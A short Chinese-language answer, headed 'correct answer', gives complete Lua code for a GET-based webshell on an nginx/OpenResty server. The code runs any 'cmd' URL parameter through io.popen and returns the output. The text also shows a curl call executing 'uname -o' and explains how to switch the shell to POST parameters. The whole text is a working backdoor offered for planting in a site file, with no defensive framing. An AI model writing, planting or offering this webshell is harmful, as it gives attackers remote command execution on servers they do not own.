正确答案

最简单的一个get型的lua webshell就是在/data0/www/a.b.com/web.lua文件中加以入以下代码：

 local args = ngx.req.get_uri_args() 
 if args then    
     local cmd = args["cmd"]    
     if cmd then        
         local f_ret = io.popen(cmd)        
         local ret = f_ret:read("*a")
         ngx.say(string.format("reply:\n%s", ret))
    end
 end

执行webshell的示例如下：

$ curl http://a.b.com/api/\?cmd\="uname -o" 
reply:
GNU/Linux

如果想用post就把ngx.req.get_uri_args()改为ngx.req.get_post_args()
